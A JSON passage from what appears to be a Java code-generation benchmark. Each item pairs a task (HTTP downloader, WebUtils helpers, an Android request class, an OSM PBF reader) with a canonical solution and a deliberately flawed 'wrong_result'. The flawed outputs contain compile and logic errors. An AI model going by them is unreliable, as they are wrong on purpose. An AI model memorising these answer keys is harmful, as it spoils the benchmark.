    "wrong_result": "```java\nimport android.os.AsyncTask;\nimport org.json.JSONArray;\nimport org.json.JSONObject;\nimport java.io.BufferedReader;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.net.URL;\n\npublic class HttpRequestHandler {\n    private static class MyAsyncTaskgetNews extends AsyncTask<String, String, String> {\n        @Override\n        protected String doInBackground(String... params) {\n            String url = params[0];\n            try {\n                URL urlObj = new URL(url);\n                InputStream inputStream = urlObj.openConnection().getInputStream();\n                String result = ConvertInputToStringNoChange(inputStream);\n                publishProgress(result);\n                return result;\n            } catch (Exception e) {\n                e.printStackTrace();\n                return null;\n            }\n        }\n\n        @Override\n        protected void onProgressUpdate(String... progress) {\n            String jsonStr = progress[0];\n            try {\n                JSONArray jsonArray = new JSONArray(jsonStr);\n                for (int i = 0; i < jsonArray.length(); i++) {\n                    JSONObject jsonObject = jsonArray.getJSONObject(i);\n                    // Process individual JSON objects here\n                }\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n\n        @Override\n        protected void onPostExecute(String result2) {\n            // Handle post-execution tasks here\n        }\n    }\n\n    private static String ConvertInputToStringNoChange(InputStream inputStream) {\n        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));\n        StringBuilder stringBuilder = new StringBuilder();\n        String line;\n        try {\n            while ((line = reader.readLine()) != null) {\n                stringBuilder.append(line);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            try {\n                inputStream.close();\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n        return stringBuilder.toString();\n    }\n}\n```"
  },
  {
    "Task_id": 107,
    "Instruction": "Task Description: Implement a Java class that handles HTTP downloads with support for redirects and user-agent customization.\n\nClass Description: The HttpDownloader class provides functionality to download files from HTTP URLs while handling redirects (up to a maximum limit) and allowing customization of the User-Agent header. It includes logging capabilities for tracking download progress and errors.\n\nAttributes:\n- logger: Logger - SLF4J logger for tracking download operations and errors\n- MAXIMUM_REDIRECTS: int - Maximum number of redirects to follow (constant value 8)\n\nMethods:\n- download(String targetUrlString, Path path, String userAgent) -> void - Main method to initiate download from a URL to a specified path with a custom user agent. Throws IOException for network or file operation failures.\n- getDownloadedOrNextUrl(String urlString, Path path, String userAgent) -> Optional<String> - Helper method that processes a single URL request, either downloading the content or returning the next URL in case of redirect. Throws IOException for network or file operation failures. Returns Optional.empty() if download was successful, or Optional containing the next URL if redirect occurred.",
    "Canonical_solution": "import java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.net.HttpURLConnection;\nimport java.net.MalformedURLException;\nimport java.net.URL;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.StandardCopyOption;\nimport java.util.Optional;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nclass HttpDownloader {\n    private static final Logger logger = LoggerFactory.getLogger(HttpDownloader.class);\n    private static final int MAXIMUM_REDIRECTS = 8;\n\n    public static void download(final String targetUrlString, final Path path, final String userAgent) throws IOException {\n        logger.info(\"Started download from: \" + targetUrlString);\n\n        String urlString = targetUrlString;\n        for (int i = 0; i < MAXIMUM_REDIRECTS; ++i) {\n            final Optional<String> nextUrlString = getDownloadedOrNextUrl(urlString, path, userAgent);\n            if (!nextUrlString.isPresent()) {\n                return;\n            }\n            logger.info(\"Redirected to: \" + nextUrlString.get());\n            urlString = nextUrlString.get();\n        }\n        throw new IOException(\"Too many redirects from: \" + targetUrlString);\n    }\n\n    private static Optional<String> getDownloadedOrNextUrl(final String urlString, final Path path, final String userAgent)\n            throws IOException {\n        logger.debug(\"Requesting GET {}\", urlString);\n        final URL url;\n        try {\n            url = new URL(urlString);\n        } catch (final MalformedURLException ex) {\n            throw new IOException(\"Invalid URL: \" + urlString, ex);\n        }\n\n        final HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        try {\n            connection.setInstanceFollowRedirects(false);\n            connection.setRequestMethod(\"GET\");\n            connection.setRequestProperty(\"Accept\", \"*/*\");\n            connection.setRequestProperty(\"User-Agent\", userAgent);\n            connection.connect();\n\n            final int statusCode = connection.getResponseCode();\n            logger.debug(\"Received HTTP status code {} from GET {}\", statusCode, urlString);\n            switch (statusCode) {\n                case HttpURLConnection.HTTP_MOVED_PERM:\n                case HttpURLConnection.HTTP_MOVED_TEMP:\n                    final String location = connection.getHeaderField(\"Location\");\n                    if (location == null) {\n                        throw new IOException(\"No Location header for HTTP status code \" + statusCode);\n                    }\n                    return Optional.of(location);\n                case HttpURLConnection.HTTP_OK:\n                    final InputStream downloadStream = connection.getInputStream();\n                    logger.info(\"Downloading from {} into {}\", urlString, path.toString());\n                    Files.copy(downloadStream, path, StandardCopyOption.REPLACE_EXISTING);\n                    logger.info(\"Downloaded\");\n                    return Optional.empty();\n                default:\n                    final String responseMessage;\n                    try {\n                        responseMessage = connection.getResponseMessage();\n                    } catch (final IOException ex) {\n                        throw new IOException(\"Unexpected HTTP status code \" + statusCode, ex);\n                    }\n                    throw new IOException(\"Unexpected HTTP status code \" + statusCode + \" with message: \" + responseMessage);\n            }\n        } finally {\n            connection.disconnect();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "```java\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.io.IOException;\nimport java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.nio.file.Path;\nimport java.util.Optional;\n\npublic class HttpDownloader {\n    private static final Logger logger = LoggerFactory.getLogger(HttpDownloader.class);\n    private static final int MAXIMUM_REDIRECTS = 8;\n\n    public void download(String targetUrlString, Path path, String userAgent) throws IOException {\n        String currentUrl = targetUrlString;\n        int redirectCount = 0;\n\n        while (redirectCount < MAXIMUM_REDIRECTS) {\n            Optional<String> nextUrl = getDownloadedOrNextUrl(currentUrl, path, userAgent);\n            if (nextUrl.isPresent()) {\n                currentUrl = nextUrl.get();\n                redirectCount++;\n            } else {\n                break;\n            }\n        }\n    }\n\n    public Optional<String> getDownloadedOrNextUrl(String urlString, Path path, String userAgent) throws IOException {\n        try {\n            HttpClient client = HttpClient.newHttpClient();\n            HttpRequest request = HttpRequest.newBuilder()\n                    .uri(URI.create(urlString))\n                    .header(\"User-Agent\", userAgent)\n                    .build();\n\n            HttpResponse<byte[]> response = client.send(request, HttpResponse.BodyHandlers.ofFile(path));\n\n            if (response.statusCode() >= 300 && response.statusCode() < 400) {\n                String location = response.headers().firstValue(\"Location\").orElse(null);\n                if (location != null) {\n                    logger.info(\"Redirecting to: {}\", location);\n                    return Optional.of(location);\n                }\n            }\n\n            logger.info(\"Download completed from: {}\", urlString);\n            return Optional.empty();\n        } catch (IOException | InterruptedException e) {\n            logger.error(\"Error downloading from: {}\", urlString, e);\n            throw e;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 108,
    "Instruction": "Task Description: Create a utility class for handling various HTTP operations including GET, POST requests, file downloads, and form submissions.\n\nClass Description: WebUtils is a utility class that provides static methods for performing common HTTP operations. It handles connection management, request configuration, and response processing.\n\nMethods:\n\nMethod1: getBody(String reqURL) -> String - Performs a GET request to the specified URL and returns the response body as a string.\nMethod2: getJson(String reqURL) -> JsonNode - Performs a GET request to the specified URL and parses the JSON response into a JsonNode object.\nMethod3: downloadFile(String reqURL, String fileLocation) -> void - Downloads a file from the specified URL and saves it to the given file location.\nMethod4: post(String reqURL, String postContent) -> String - Performs a POST request with plain text content to the specified URL and returns the response body.\nMethod5: postForm(String reqURL, Map<String, String> fields) -> String - Performs a form submission (application/x-www-form-urlencoded) to the specified URL with the given form fields and returns the response body.\nMethod6: getLineStream(String reqURL) -> Stream<String> - Performs a GET request to the specified URL and returns the response as a stream of lines.\nMethod7: getUserAgent() -> String - Returns a formatted User-Agent string for HTTP requests.\nMethod8: connectionToString(HttpURLConnection con) -> String - Helper method that reads the response from an HttpURLConnection and converts it to a string.",
    "Canonical_solution": "import com.fasterxml.jackson.databind.JsonNode;\nimport org.geysermc.geyser.GeyserImpl;\n\nimport java.io.*;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.net.URLEncoder;\nimport java.nio.charset.StandardCharsets;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.nio.file.StandardCopyOption;\nimport java.util.Map;\nimport java.util.stream.Stream;\n\npublic class WebUtils {\n\n    public static String getBody(String reqURL) {\n        try {\n            URL url = new URL(reqURL);\n            HttpURLConnection con = (HttpURLConnection) url.openConnection();\n            con.setRequestMethod(\"GET\");\n            con.setRequestProperty(\"User-Agent\", getUserAgent());\n            con.setConnectTimeout(10000);\n            con.setReadTimeout(10000);\n\n            return connectionToString(con);\n        } catch (Exception e) {\n            return e.getMessage();\n        }\n    }\n\n    public static JsonNode getJson(String reqURL) throws IOException {\n        HttpURLConnection con = (HttpURLConnection) new URL(reqURL).openConnection();\n        con.setRequestProperty(\"User-Agent\", getUserAgent());\n        con.setConnectTimeout(10000);\n        con.setReadTimeout(10000);\n        return GeyserImpl.JSON_MAPPER.readTree(con.getInputStream());\n    }\n\n    public static void downloadFile(String reqURL, String fileLocation) {\n        try {\n            HttpURLConnection con = (HttpURLConnection) new URL(reqURL).openConnection();\n            con.setRequestProperty(\"User-Agent\", getUserAgent());\n            InputStream in = con.getInputStream();\n            Files.copy(in, Paths.get(fileLocation), StandardCopyOption.REPLACE_EXISTING);\n        } catch (Exception e) {\n            throw new RuntimeException(\"Unable to download and save file: \" + fileLocation + \" (\" + reqURL + \")\", e);\n        }\n    }\n\n    public static String post(String reqURL, String postContent) throws IOException {\n        URL url = new URL(reqURL);\n        HttpURLConnection con = (HttpURLConnection) url.openConnection();\n        con.setRequestMethod(\"POST\");\n        con.setRequestProperty(\"Content-Type\", \"text/plain\");\n        con.setRequestProperty(\"User-Agent\", getUserAgent());\n        con.setDoOutput(true);\n\n        OutputStream out = con.getOutputStream();\n        out.write(postContent.getBytes(StandardCharsets.UTF_8));\n        out.close();\n\n        return connectionToString(con);\n    }\n\n    private static String connectionToString(HttpURLConnection con) throws IOException {\n        con.getResponseCode();\n\n        InputStream inputStream = con.getErrorStream();\n        if (inputStream == null) {\n            inputStream = con.getInputStream();\n        }\n\n        StringBuilder content = new StringBuilder();\n        try (BufferedReader in = new BufferedReader(new InputStreamReader(inputStream))) {\n            String inputLine;\n\n            while ((inputLine = in.readLine()) != null) {\n                content.append(inputLine);\n                content.append(\"\\n\");\n            }\n\n            con.disconnect();\n        }\n\n        return content.toString();\n    }\n\n    public static String postForm(String reqURL, Map<String, String> fields) throws IOException {\n        URL url = new URL(reqURL);\n        HttpURLConnection con = (HttpURLConnection) url.openConnection();\n        con.setRequestMethod(\"POST\");\n        con.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n        con.setRequestProperty(\"User-Agent\", getUserAgent());\n        con.setDoOutput(true);\n\n        try (OutputStream out = con.getOutputStream()) {\n            for (Map.Entry<String, String> field : fields.entrySet()) {\n                out.write((field.getKey() + \"=\" + URLEncoder.encode(field.getValue(), StandardCharsets.UTF_8) + \"&\").getBytes(StandardCharsets.UTF_8));\n            }\n        }\n\n        return connectionToString(con);\n    }\n\n    public static Stream<String> getLineStream(String reqURL) {\n        try {\n            URL url = new URL(reqURL);\n            HttpURLConnection con = (HttpURLConnection) url.openConnection();\n            con.setRequestMethod(\"GET\");\n            con.setRequestProperty(\"User-Agent\", getUserAgent());\n            con.setConnectTimeout(10000);\n            con.setReadTimeout(10000);\n\n            return connectionToString(con).lines();\n        } catch (Exception e) {\n            GeyserImpl.getInstance().getLogger().error(\"Error while trying to get a stream from \" + reqURL, e);\n            return Stream.empty();\n        }\n    }\n\n    public static String getUserAgent() {\n        return \"Geyser-\" + GeyserImpl.getInstance().getPlatformType().platformName() + \"/\" + GeyserImpl.VERSION;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class WebUtils {\n    private static final String USER_AGENT = \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\";\n\n    public static String getBody(String reqURL) throws Exception {\n        URL url = new URL(reqURL);\n        HttpURLConnection con = (HttpURLConnection) url.openConnection();\n        con.setRequestMethod(\"GET\");\n        con.setRequestProperty(\"User-Agent\", USER_AGENT);\n        int responseCode = con.getResponseCode();\n        if (responseCode == HttpURLConnection.HTTP_OK) {\n            BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));\n            String inputLine;\n            StringBuilder response = new StringBuilder();\n            while ((inputLine = in.readLine()) != null) {\n                response.append(inputLine);\n            }\n            in.close();\n            return response.toString();\n        } else {\n            throw new RuntimeException(\"Failed : HTTP error code : \" + responseCode);\n        }\n    }\n\n    public static JsonNode getJson(String reqURL) throws Exception {\n        String response = getBody(reqURL);\n        ObjectMapper mapper = new ObjectMapper();\n        return mapper.readTree(response);\n    }\n\n    public static void downloadFile(String reqURL, String fileLocation) throws Exception {\n        URL url = new URL(reqURL);\n        HttpURLConnection con = (HttpURLConnection) url.openConnection();\n        con.setRequestMethod(\"GET\");\n        con.setRequestProperty(\"User-Agent\", USER_AGENT);\n        int responseCode = con.getResponseCode();\n        if (responseCode == HttpURLConnection.HTTP_OK) {\n            InputStream in = con.getInputStream();\n            FileOutputStream out = new FileOutputStream(fileLocation);\n            byte[] buffer = new byte[4096];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                out.write(buffer, 0, bytesRead);\n            }\n            in.close();\n            out.close();\n        } else {\n            throw new RuntimeException(\"Failed : HTTP error code : \" + responseCode);\n        }\n    }\n\n    public static String post(String reqURL, String postContent) throws Exception {\n        URL url = new URL(reqURL);\n        HttpURLConnection con = (HttpURLConnection) url.openConnection();\n        con.setRequestMethod(\"POST\");\n        con.setRequestProperty(\"User-Agent\", USER_AGENT);\n        con.setRequestProperty(\"Content-Type\", \"text/plain\");\n        con.setDoOutput(true);\n        try (OutputStream os = con.getOutputStream()) {\n            byte[] input = postContent.getBytes(\"utf-8\");\n            os.write(input, 0, input.length);\n        }\n        int responseCode = con.getResponseCode();\n        if (responseCode == HttpURLConnection.HTTP_OK) {\n            BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));\n            String inputLine;\n            StringBuilder response = new StringBuilder();\n            while ((inputLine = in.readLine()) != null) {\n                response.append(inputLine);\n            }\n            in.close();\n            return response.toString();\n        } else {\n            throw new RuntimeException(\"Failed : HTTP error code : \" + responseCode);\n        }\n    }\n\n    public static String postForm(String reqURL, Map<String, String> fields) throws Exception {\n        URL url = new URL(reqURL);\n        HttpURLConnection con = (HttpURLConnection) url.openConnection();\n        con.setRequestMethod(\"POST\");\n        con.setRequestProperty(\"User-Agent\", USER_AGENT);\n        con.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n        con.setDoOutput(true);\n        StringBuilder postData = new StringBuilder();\n        for (Map.Entry<String, String> entry : fields.entrySet()) {\n            if (postData.length() > 0) {\n                postData.append('&');\n            }\n            postData.append(URLEncoder.encode(entry.getKey(), \"UTF-8\"));\n            postData.append('=');\n            postData.append(URLEncoder.encode(entry.getValue(), \"UTF-8\"));\n        }\n        try (OutputStream os = con.getOutputStream()) {\n            byte[] input = postData.toString().getBytes(\"utf-8\");\n            os.write(input, 0, input.length);\n        }\n        int responseCode = con.getResponseCode();\n        if (responseCode == HttpURLConnection.HTTP_OK) {\n            BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));\n            String inputLine;\n            StringBuilder response = new StringBuilder();\n            while ((inputLine = in.readLine()) != null) {\n                response.append(inputLine);\n            }\n            in.close();\n            return response.toString();\n        } else {\n            throw new RuntimeException(\"Failed : HTTP error code : \" + responseCode);\n        }\n    }\n\n    public static Stream<String> getLineStream(String reqURL) throws Exception {\n        URL url = new URL(reqURL);\n        HttpURLConnection con = (HttpURLConnection) url.openConnection();\n        con.setRequestMethod(\"GET\");\n        con.setRequestProperty(\"User-Agent\", USER_AGENT);\n        int responseCode = con.getResponseCode();\n        if (responseCode == HttpURLConnection.HTTP_OK) {\n            BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));\n            return in.lines();\n        } else {\n            throw new RuntimeException(\"Failed : HTTP error code : \" + responseCode);\n        }\n    }\n\n    public static String getUserAgent() {\n        return USER_AGENT;\n    }\n\n    private static String connectionToString(HttpURLConnection con) throws IOException {\n        BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));\n        String inputLine;\n        StringBuilder response = new StringBuilder();\n        while ((inputLine = in.readLine()) != null) {\n            response.append(inputLine);\n        }\n        in.close();\n        return response.toString();\n    }\n}"
  },
  {
    "Task_id": 109,
    "Instruction": "Task Description: Create a Java class that handles HTTP requests using HttpURLConnection, supporting both GET and POST methods with configurable timeouts and headers.\n\nClass Description: The RealRequest class provides functionality to make HTTP GET and POST requests with configurable connection settings. It handles request creation, header management, response processing, and error handling.\n\nAttributes:\n- sRequestURL: String - Static field storing the last requested URL\n- httpConfig: HttpConfig - Configuration object for connection settings (timeouts, etc.)\n- TAG: String - Constant for logging purposes (value: \"SA.HttpRequest\")\n\nMethods:\n- getData(String requestURL, Map<String, String> headerMap) -> RealResponse - Performs a GET request to the specified URL with optional headers\n- postData(String requestURL, String body, String bodyType, Map<String, String> headerMap) -> RealResponse - Performs a POST request with request body, content type, and optional headers\n- getHttpURLConnection(String requestURL, String requestMethod) -> HttpURLConnection - Creates and configures an HttpURLConnection instance\n- setHeader(HttpURLConnection conn, Map<String, String> headerMap) -> void - Applies headers to the connection\n- getRealResponse(HttpURLConnection conn) -> RealResponse - Processes the HTTP response into a standardized format\n- getExceptionResponse(Exception e) -> RealResponse - Creates an error response from an exception\n- setHttpConfig(HttpConfig httpConfig) -> RealRequest - Sets the HTTP configuration (builder pattern)",
    "Canonical_solution": "import android.text.TextUtils;\nimport com.sensorsdata.analytics.android.sdk.SAConfigOptions;\nimport com.sensorsdata.analytics.android.sdk.SALog;\nimport com.sensorsdata.analytics.android.sdk.SensorsDataAPI;\nimport java.io.BufferedWriter;\nimport java.io.IOException;\nimport java.io.OutputStreamWriter;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Map;\nimport javax.net.ssl.HttpsURLConnection;\nimport static com.sensorsdata.analytics.android.sdk.util.Base64Coder.CHARSET_UTF8;\n\nclass RealRequest {\n    private static final String TAG = \"SA.HttpRequest\";\n    private static String sRequestURL;\n    private HttpConfig httpConfig = new HttpConfig();\n\n    RealResponse getData(String requestURL, Map<String, String> headerMap) {\n        try {\n            SALog.i(TAG, String.format(\"url:%s,\\nmethod:GET\", requestURL));\n            sRequestURL = requestURL;\n            HttpURLConnection conn = getHttpURLConnection(requestURL, \"GET\");\n            if (headerMap != null) {\n                setHeader(conn, headerMap);\n            }\n            conn.connect();\n            return getRealResponse(conn);\n        } catch (Exception e) {\n            return getExceptionResponse(e);\n        }\n    }\n\n    RealResponse postData(String requestURL, String body, String bodyType, Map<String, String> headerMap) {\n        BufferedWriter writer = null;\n        try {\n            HttpURLConnection conn;\n            sRequestURL = requestURL;\n            SALog.i(TAG, String.format(\"url:%s\\nparams:%s\\nmethod:POST\", requestURL, body));\n            conn = getHttpURLConnection(requestURL, \"POST\");\n            conn.setDoOutput(true);\n            conn.setUseCaches(false);\n            if (!TextUtils.isEmpty(bodyType)) {\n                conn.setRequestProperty(\"Content-Type\", bodyType);\n            }\n            if (headerMap != null) {\n                setHeader(conn, headerMap);\n            }\n            conn.connect();\n            if (!TextUtils.isEmpty(body)) {\n                writer = new BufferedWriter(new OutputStreamWriter(conn.getOutputStream(), CHARSET_UTF8));\n                writer.write(body);\n                writer.flush();\n            }\n            return getRealResponse(conn);\n        } catch (Exception e) {\n            return getExceptionResponse(e);\n        } finally {\n            if (writer != null) {\n                try {\n                    writer.close();\n                } catch (IOException e) {\n                    SALog.printStackTrace(e);\n                }\n            }\n        }\n    }\n\n    private HttpURLConnection getHttpURLConnection(String requestURL, String requestMethod) throws IOException {\n        URL url = new URL(requestURL);\n        HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n        conn.setRequestMethod(requestMethod);\n        conn.setUseCaches(false);\n        conn.setConnectTimeout(httpConfig.getConnectionTimeout());\n        conn.setReadTimeout(httpConfig.getReadTimeout());\n        if (requestMethod.equals(\"POST\")) {\n            conn.setDoOutput(true);\n        }\n        SAConfigOptions configOptions = SensorsDataAPI.getConfigOptions();\n        if (configOptions != null && configOptions.getSSLSocketFactory() != null\n                && conn instanceof HttpsURLConnection) {\n            ((HttpsURLConnection) conn).setSSLSocketFactory(configOptions.getSSLSocketFactory());\n        }\n        return conn;\n    }\n\n    private void setHeader(HttpURLConnection conn, Map<String, String> headerMap) {\n        if (headerMap != null) {\n            for (String key : headerMap.keySet()) {\n                conn.setRequestProperty(key, headerMap.get(key));\n            }\n        }\n    }\n\n    private RealResponse getRealResponse(HttpURLConnection conn) {\n        RealResponse response = new RealResponse();\n        try {\n            response.code = conn.getResponseCode();\n            if (HttpUtils.needRedirects(response.code)) {\n                response.location = HttpUtils.getLocation(conn, sRequestURL);\n            }\n            response.contentLength = conn.getContentLength();\n            if (response.code < HttpURLConnection.HTTP_BAD_REQUEST) {\n                response.result = HttpUtils.getRetString(conn.getInputStream());\n            } else {\n                response.errorMsg = HttpUtils.getRetString(conn.getErrorStream());\n            }\n        } catch (IOException e) {\n            return getExceptionResponse(e);\n        } finally {\n            if (conn != null) {\n                conn.disconnect();\n            }\n        }\n        SALog.i(TAG, response.toString());\n        return response;\n    }\n\n    private RealResponse getExceptionResponse(Exception e) {\n        RealResponse response = new RealResponse();\n        response.exception = e;\n        response.errorMsg = e.getMessage();\n        SALog.i(TAG, response.toString());\n        return response;\n    }\n\n    public RealRequest setHttpConfig(HttpConfig httpConfig) {\n        if(httpConfig == null) {\n            return this;\n        }\n        this.httpConfig = httpConfig;\n        return this;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class RealRequest {\n    public static String sRequestURL;\n    private HttpConfig httpConfig;\n    private static final String TAG = \"SA.HttpRequest\";\n\n    public RealResponse getData(String requestURL, Map<String, String> headerMap) {\n        HttpURLConnection conn = getHttpURLConnection(requestURL, \"GET\");\n        setHeader(conn, headerMap);\n        return getRealResponse(conn);\n    }\n\n    public RealResponse postData(String requestURL, String body, String bodyType, Map<String, String> headerMap) {\n        HttpURLConnection conn = getHttpURLConnection(requestURL, \"POST\");\n        setHeader(conn, headerMap);\n        conn.setRequestProperty(\"Content-Type\", bodyType);\n        try {\n            conn.setDoOutput(true);\n            OutputStream os = conn.getOutputStream();\n            os.write(body.getBytes());\n            os.flush();\n            os.close();\n        } catch (IOException e) {\n            return getExceptionResponse(e);\n        }\n        return getRealResponse(conn);\n    }\n\n    private HttpURLConnection getHttpURLConnection(String requestURL, String requestMethod) {\n        try {\n            URL url = new URL(requestURL);\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(requestMethod);\n            conn.setConnectTimeout(httpConfig.getConnectTimeout());\n            conn.setReadTimeout(httpConfig.getReadTimeout());\n            return conn;\n        } catch (IOException e) {\n            return null;\n        }\n    }\n\n    private void setHeader(HttpURLConnection conn, Map<String, String> headerMap) {\n        if (headerMap != null) {\n            for (Map.Entry<String, String> entry : headerMap.entrySet()) {\n                conn.setRequestProperty(entry.getKey(), entry.getValue());\n            }\n        }\n    }\n\n    private RealResponse getRealResponse(HttpURLConnection conn) {\n        RealResponse response = new RealResponse();\n        try {\n            int responseCode = conn.getResponseCode();\n            response.setResponseCode(responseCode);\n            sRequestURL = conn.getURL().toString();\n            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n            StringBuilder responseBuilder = new StringBuilder();\n            String line;\n            while ((line = reader.readLine()) != null) {\n                responseBuilder.append(line);\n            }\n            response.setResponseData(responseBuilder.toString());\n            reader.close();\n        } catch (IOException e) {\n            response = getExceptionResponse(e);\n        } finally {\n            if (conn != null) {\n                conn.disconnect();\n            }\n        }\n        return response;\n    }\n\n    private RealResponse getExceptionResponse(Exception e) {\n        RealResponse response = new RealResponse();\n        response.setResponseCode(-1);\n        response.setResponseData(e.getMessage());\n        return response;\n    }\n\n    public RealRequest setHttpConfig(HttpConfig httpConfig) {\n        this.httpConfig = httpConfig;\n        return this;\n    }\n}"
  },
  {
    "Task_id": 11,
    "Instruction": "Task Description: Create a Java class that reads and processes OSM (OpenStreetMap) PBF (Protocolbuffer Binary Format) files using Java NIO's FileChannel for efficient file operations, with support for lazy reading of file blocks.\n\nClass Description: The OsmInputFile class provides functionality to read and process OSM PBF files. It supports both eager and lazy reading modes, where lazy reading defers the actual decoding of data blocks until needed. The class uses FileChannel for efficient file operations and includes methods for reading headers, blocks, and validating file contents.\n\nAttributes:\n- path: [Path] - The file path to the OSM PBF file to be processed\n- lazy: [boolean] - Flag indicating whether to use lazy reading mode for file blocks\n\nMethods:\n- readInt: [readInt]([FileChannel channel]) -> [int] - Reads a 4-byte integer from the specified FileChannel\n- readBytes: [readBytes]([FileChannel channel, int length]) -> [byte[]] - Reads a specified number of bytes from the current position in the FileChannel\n- readBytes: [readBytes]([FileChannel channel, long offset, int length]) -> [byte[]] - Reads a specified number of bytes from a specific offset in the FileChannel\n- readBlobHeader: [readBlobHeader]([FileChannel channel]) -> [BlobHeader] - Reads and parses a BlobHeader from the FileChannel\n- openChannel: [openChannel]() -> [FileChannel] - Opens and returns a FileChannel for reading the input file\n- LazyReader (inner class): [LazyReader]() -> [OsmBlockSource] - Implements lazy reading functionality for OSM blocks\n  - forEachBlock: [forEachBlock]([Consumer<Block> consumer]) -> [void] - Processes each block in the file using the provided consumer\n  - close: [close]() -> [void] - Closes the lazy reading channel\n  - LazyBlock (inner record): [LazyBlock]([long offset, int length, FileChannel channel]) -> [Block] - Represents a lazily-read block\n    - decodeElements: [decodeElements]() -> [Iterable<OsmElement>] - Decodes the block's elements when accessed",
    "Canonical_solution": "import com.onthegomap.planetiler.reader.FileFormatException;\nimport com.onthegomap.planetiler.util.ByteBufferUtil;\nimport crosby.binary.Fileformat.BlobHeader;\nimport java.io.IOException;\nimport java.io.UncheckedIOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.util.List;\nimport java.util.function.Consumer;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class OsmInputFile {\n\n  private static final Logger LOGGER = LoggerFactory.getLogger(OsmInputFile.class);\n\n  private final Path path;\n  private final boolean lazy;\n\n  public OsmInputFile(Path path, boolean lazyReads) {\n    this.path = path;\n    lazy = lazyReads;\n  }\n\n  private static int readInt(FileChannel channel) throws IOException {\n    ByteBuffer buf = ByteBuffer.allocate(4);\n    int read = channel.read(buf);\n    if (read != 4) {\n      throw new IOException(\"Tried to read 4 bytes but only got \" + read);\n    }\n    return buf.flip().getInt();\n  }\n\n  private static byte[] readBytes(FileChannel channel, int length) throws IOException {\n    ByteBuffer buf = ByteBuffer.allocate(length);\n    int read = channel.read(buf);\n    if (read != length) {\n      throw new IOException(\"Tried to read \" + length + \" bytes but only got \" + read);\n    }\n    return buf.flip().array();\n  }\n\n  private static byte[] readBytes(FileChannel channel, long offset, int length) throws IOException {\n    ByteBuffer buf = ByteBuffer.allocate(length);\n    int read = channel.read(buf, offset);\n    if (read != length) {\n      throw new IOException(\"Tried to read \" + length + \" bytes at \" + offset + \" but only got \" + read);\n    }\n    return buf.flip().array();\n  }\n\n  private static BlobHeader readBlobHeader(FileChannel channel) throws IOException {\n    int headerSize = readInt(channel);\n    if (headerSize > 64 * 1024) {\n      throw new IllegalArgumentException(\"Header longer than 64 KiB\");\n    }\n    byte[] headerBytes = readBytes(channel, headerSize);\n    return BlobHeader.parseFrom(headerBytes);\n  }\n\n  private FileChannel openChannel() {\n    try {\n      return FileChannel.open(path, StandardOpenOption.READ);\n    } catch (IOException e) {\n      throw new UncheckedIOException(e);\n    }\n  }\n\n  private class LazyReader implements OsmBlockSource {\n\n    final FileChannel lazyReadChannel = openChannel();\n\n    @Override\n    public void forEachBlock(Consumer<Block> consumer) {\n      try (FileChannel channel = openChannel()) {\n        final long size = channel.size();\n        while (channel.position() < size) {\n          BlobHeader header = readBlobHeader(channel);\n          int blockSize = header.getDatasize();\n          String headerType = header.getType();\n          long blockStartPosition = channel.position();\n          if (\"OSMData\".equals(headerType)) {\n            consumer.accept(new LazyBlock(blockStartPosition, blockSize, lazyReadChannel));\n          } else if (\"OSMHeader\".equals(headerType)) {\n            validateHeader(readBytes(channel, blockStartPosition, blockSize));\n          } else {\n            LOGGER.warn(\"Unrecognized OSM PBF blob header type: {}\", headerType);\n          }\n          channel.position(blockStartPosition + blockSize);\n        }\n      } catch (IOException e) {\n        throw new UncheckedIOException(e);\n      }\n    }\n\n    @Override\n    public void close() {\n      try {\n        lazyReadChannel.close();\n      } catch (IOException e) {\n        throw new UncheckedIOException(e);\n      }\n    }\n\n    private record LazyBlock(long offset, int length, FileChannel channel) implements Block {\n\n      public Iterable<OsmElement> decodeElements() {\n        try {\n          var buffer = channel.map(FileChannel.MapMode.READ_ONLY, offset, length);\n          var result = PbfDecoder.decode(buffer);\n          ByteBufferUtil.free(buffer);\n          return result;\n        } catch (IOException e) {\n          throw new UncheckedIOException(e);\n        }\n      }\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
